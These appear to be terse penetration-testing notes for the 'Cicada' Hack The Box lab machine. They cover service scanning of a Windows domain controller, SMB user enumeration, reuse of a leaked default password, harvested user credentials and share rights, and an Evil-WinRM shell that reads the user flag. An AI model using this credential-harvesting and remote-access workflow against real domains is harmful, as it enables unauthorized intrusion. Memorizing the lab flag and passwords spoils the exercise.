
10.129.169.79

---

dc
dns
smb
5985 winrm

Microsoft Windows Active Directory LDAP
Domain: cicada.htb0.
commonName=CICADA-DC.cicada.htb
DNS:CICADA-DC.cicada.htb

Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

clock-skew: 6h59m59s

---

To hosts

10.129.169.79 CICADA-DC.cicada.htb cicada.htb CICADA-DC cicada


---

`Your default password is: Cicada$M6Corpb*@Lp#nZp!8`
`Cicada$M6Corpb*@Lp#nZp!8`
`support@cicada.htb`

---


SMB         10.129.169.79   445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)

SMB         10.129.169.79   445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)

SMB         10.129.169.79   445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars

---

`michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`
`david.orelious:aRt$Lp#7t*VQ!3` - has read on dev
`emily.oscars:Q!3@Lp#M6b*7t*Vt` - has c$ read/write

---

bloodhound

![[Images/Pasted image 20250731203828.png]]

---

emily can winrm:

\*Evil-WinRM\* PS C:\Users\emily.oscars.CICADA\desktop> type user.txt
dc022bac90643267cc71414f3496f6f9

---


